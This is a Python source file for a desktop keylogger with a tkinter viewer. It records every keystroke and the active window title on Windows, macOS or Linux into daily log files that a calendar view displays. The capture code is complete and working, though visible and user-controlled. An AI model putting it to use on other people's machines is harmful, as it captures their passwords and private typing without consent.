import tkinter as tk
from tkinter import ttk, scrolledtext
from tkcalendar import Calendar
import datetime
import os
import platform
import threading
from pynput import keyboard

# Detect OS and import appropriate libraries for process monitoring
if platform.system() == "Windows":
    try:
        import win32gui
        import win32process
        import psutil

        WINDOWS_LIBS_AVAILABLE = True
    except ImportError:
        WINDOWS_LIBS_AVAILABLE = False
        print("Warning: pywin32 and psutil not installed. Install with: pip install pywin32 psutil")


    def get_active_window():
        if not WINDOWS_LIBS_AVAILABLE:
            return "N/A (libraries not installed)"
        try:
            window = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(window)[1]
            process = psutil.Process(pid)
            window_title = win32gui.GetWindowText(window)
            return f"{process.name()} - {window_title}"
        except:
            return "Unknown"

elif platform.system() == "Darwin":
    try:
        from AppKit import NSWorkspace

        MACOS_LIBS_AVAILABLE = True
    except ImportError:
        MACOS_LIBS_AVAILABLE = False
        print("Warning: pyobjc not installed. Install with: pip install pyobjc-framework-Cocoa")


    def get_active_window():
        if not MACOS_LIBS_AVAILABLE:
            return "N/A (libraries not installed)"
        try:
            active_app = NSWorkspace.sharedWorkspace().activeApplication()
            return f"{active_app['NSApplicationName']}"
        except:
            return "Unknown"

elif platform.system() == "Linux":
    import subprocess


    def get_active_window():
        try:
            window_id = subprocess.check_output(['xdotool', 'getactivewindow']).decode().strip()
            window_name = subprocess.check_output(['xdotool', 'getwindowname', window_id]).decode().strip()
            return window_name
        except:
            return "Unknown"
else:
    def get_active_window():
        return "Unsupported OS"


def get_log_filename(log_directory):
    """Generate log filename based on current date"""
    date_str = datetime.datetime.now().strftime("%Y-%m-%d")
    return os.path.join(log_directory, f"keylog_{date_str}.txt")


class KeyloggerViewerUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger with Viewer")
        self.root.geometry("1200x700")
        self.root.configure(bg="#f0f0f0")

        self.log_directory = "keylogs"
        self.is_logging = False
        self.current_executable = "Not running"
        self.listener = None

        # Keylogger state
        self.current_window = ""
        self.current_log_file = ""

        # Create log directory if it doesn't exist
        if not os.path.exists(self.log_directory):
            os.makedirs(self.log_directory)

        # Create main container
        self.create_ui()

        # Start updating status
        self.update_status()

    def create_ui(self):
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Left panel - Calendar and Controls
        left_panel = ttk.Frame(main_frame, width=300)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, padx=(0, 10))

        # Keylogger Control Section
        control_frame = ttk.LabelFrame(left_panel, text="Keylogger Control", padding=10)
        control_frame.pack(fill=tk.X, pady=(0, 10))

        self.start_btn = ttk.Button(
            control_frame,
            text="▶ Start Logging",
            command=self.start_logging,
            style="Start.TButton"
        )
        self.start_btn.pack(fill=tk.X, pady=5)

        self.stop_btn = ttk.Button(
            control_frame,
            text="⏸ Stop Logging",
            command=self.stop_logging,
            state=tk.DISABLED,
            style="Stop.TButton"
        )
        self.stop_btn.pack(fill=tk.X, pady=5)

        # Status indicator
        self.logging_status = ttk.Label(
            control_frame,
            text="● Stopped",
            font=("Arial", 10, "bold"),
            foreground="red"
        )
        self.logging_status.pack(pady=5)

        # Calendar Section
        calendar_label = ttk.Label(left_panel, text="Select Date", font=("Arial", 14, "bold"))
        calendar_label.pack(pady=(10, 10))

        # Calendar widget
        self.calendar = Calendar(
            left_panel,
            selectmode='day',
            year=datetime.datetime.now().year,
            month=datetime.datetime.now().month,
            day=datetime.datetime.now().day,
            background="darkblue",
            foreground="white",
            headersbackground="lightblue",
            normalbackground="white",
            weekendbackground="lightyellow",
            selectbackground="red",
            font=("Arial", 10)
        )
        self.calendar.pack(fill=tk.BOTH, expand=True)

        # Load button
        load_btn = ttk.Button(left_panel, text="Load Selected Date", command=self.load_log_file)
        load_btn.pack(pady=10, fill=tk.X)

        # Refresh button
        refresh_btn = ttk.Button(left_panel, text="🔄 Refresh Current", command=self.refresh_current_log)
        refresh_btn.pack(pady=(0, 10), fill=tk.X)

        # Right panel - Viewing Area
        right_panel = ttk.Frame(main_frame)
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        # Status Header
        status_frame = ttk.Frame(right_panel)
        status_frame.pack(fill=tk.X, pady=(0, 10))

        # Connection status label
        ttk.Label(status_frame, text="Status:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
        self.status_label = ttk.Label(
            status_frame,
            text="Ready",
            font=("Arial", 11, "bold"),
            foreground="orange"
        )
        self.status_label.pack(side=tk.LEFT, padx=5)

        # Separator
        ttk.Separator(status_frame, orient=tk.VERTICAL).pack(side=tk.LEFT, fill=tk.Y, padx=10)

        # Tracked executable
        ttk.Label(status_frame, text="Tracking:", font=("Arial", 10)).pack(side=tk.LEFT)
        self.executable_label = ttk.Label(
            status_frame,
            text=self.current_executable,
            font=("Arial", 10, "bold"),
            foreground="blue"
        )
        self.executable_label.pack(side=tk.LEFT, padx=5)

        # Separator line
        ttk.Separator(right_panel, orient=tk.HORIZONTAL).pack(fill=tk.X, pady=5)

        # Date display
        self.date_label = ttk.Label(
            right_panel,
            text="No date selected",
            font=("Arial", 12, "bold")
        )
        self.date_label.pack(pady=5)

        # Central Viewing Area - Text display
        view_frame = ttk.Frame(right_panel)
        view_frame.pack(fill=tk.BOTH, expand=True)

        # ScrolledText widget for log content
        self.log_text = scrolledtext.ScrolledText(
            view_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            bg="#1e1e1e",
            fg="#d4d4d4",
            insertbackground="white"
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)

        # Bottom info bar
        info_frame = ttk.Frame(right_panel)
        info_frame.pack(fill=tk.X, pady=(10, 0))

        self.info_label = ttk.Label(
            info_frame,
            text="Start keylogger or select a date to view logs",
            font=("Arial", 9),
            foreground="gray"
        )
        self.info_label.pack(side=tk.LEFT)

    def start_logging(self):
        """Start the keylogger"""
        if not self.is_logging:
            self.is_logging = True
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            self.logging_status.config(text="● Logging", foreground="green")
            self.status_label.config(text="Connected", foreground="green")

            # Start listener in a separate thread
            def start_listener():
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()
                self.listener.join()

            self.listener_thread = threading.Thread(target=start_listener, daemon=True)
            self.listener_thread.start()

            self.info_label.config(
                text="Keylogger is running. All keystrokes are being logged.",
                foreground="green"
            )

    def stop_logging(self):
        """Stop the keylogger"""
        if self.is_logging:
            self.is_logging = False
            if self.listener:
                self.listener.stop()
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.logging_status.config(text="● Stopped", foreground="red")
            self.status_label.config(text="Ready", foreground="orange")
            self.current_executable = "Not running"

            self.info_label.config(
                text="Keylogger stopped.",
                foreground="red"
            )

    def on_press(self, key):
        """Handle key press events - from original keylogger code"""
        if not self.is_logging:
            return

        # Get the log file for today
        log_file = get_log_filename(self.log_directory)

        # Check if we've switched to a new day's log file
        if log_file != self.current_log_file:
            self.current_log_file = log_file
            with open(log_file, "a", encoding="utf-8") as f:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\n{'=' * 60}\n")
                f.write(f"[{timestamp}] NEW SESSION STARTED\n")
                f.write(f"{'=' * 60}\n")

        # Get current active window
        active_window = get_active_window()

        # Log window change
        if active_window != self.current_window:
            self.current_window = active_window
            with open(log_file, "a", encoding="utf-8") as f:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\n{'=' * 60}\n")
                f.write(f"[{timestamp}] APPLICATION: {self.current_window}\n")
                f.write(f"{'=' * 60}\n")

        # Log keystroke with timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            # Regular character keys
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {key.char}\n")
        except AttributeError:
            # Special keys
            with open(log_file, "a", encoding="utf-8") as f:
                if key == keyboard.Key.space:
                    f.write(f"[{timestamp}] [SPACE]\n")
                elif key == keyboard.Key.enter:
                    f.write(f"[{timestamp}] [ENTER]\n")
                elif key == keyboard.Key.tab:
                    f.write(f"[{timestamp}] [TAB]\n")
                elif key == keyboard.Key.backspace:
                    f.write(f"[{timestamp}] [BACKSPACE]\n")
                else:
                    f.write(f"[{timestamp}] {key}\n")

    def load_log_file(self):
        """Load log file for selected date"""
        # Get selected date from calendar
        selected_date = self.calendar.get_date()

        # Convert to datetime object and format
        date_obj = datetime.datetime.strptime(selected_date, "%m/%d/%y")
        date_str = date_obj.strftime("%Y-%m-%d")

        # Construct filename
        log_filename = os.path.join(self.log_directory, f"keylog_{date_str}.txt")

        # Update date label
        self.date_label.config(text=f"Log for: {date_obj.strftime('%B %d, %Y')}")

        # Clear current content
        self.log_text.delete(1.0, tk.END)

        # Try to load and display the file
        if os.path.exists(log_filename):
            try:
                with open(log_filename, 'r', encoding='utf-8') as f:
                    content = f.read()
                    self.log_text.insert(1.0, content)
                    # Auto-scroll to bottom
                    self.log_text.see(tk.END)
                    self.info_label.config(
                        text=f"Loaded: {log_filename}",
                        foreground="green"
                    )
            except Exception as e:
                self.log_text.insert(1.0, f"Error reading file: {str(e)}")
                self.info_label.config(
                    text=f"Error loading file: {str(e)}",
                    foreground="red"
                )
        else:
            self.log_text.insert(
                1.0,
                f"No log file found for {date_obj.strftime('%B %d, %Y')}\n\n"
                f"Expected file: {log_filename}\n\n"
                f"This could mean:\n"
                f"• No keylogging data was recorded on this date\n"
                f"• The log file hasn't been created yet\n"
                f"• The keylogger wasn't running on this date"
            )
            self.info_label.config(
                text=f"No log file found for selected date",
                foreground="orange"
            )

    def refresh_current_log(self):
        """Refresh the currently displayed log file"""
        if self.is_logging:
            # Load today's log
            today = datetime.datetime.now()
            self.calendar.selection_set(today)
            self.load_log_file()
        else:
            # Just reload the selected date
            self.load_log_file()

    def update_status(self):
        """Update current executable being tracked"""
        if self.is_logging:
            try:
                self.current_executable = get_active_window()
                self.executable_label.config(text=self.current_executable)
            except:
                self.executable_label.config(text="Unknown")
        else:
            self.executable_label.config(text="Not running")

        # Schedule next update (every 2 seconds)
        self.root.after(2000, self.update_status)


def main():
    root = tk.Tk()

    # Configure button styles
    style = ttk.Style()
    style.configure("Start.TButton", foreground="green")
    style.configure("Stop.TButton", foreground="red")

    app = KeyloggerViewerUI(root)

    # Handle window close
    def on_closing():
        if app.is_logging:
            app.stop_logging()
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()


if __name__ == "__main__":
    main()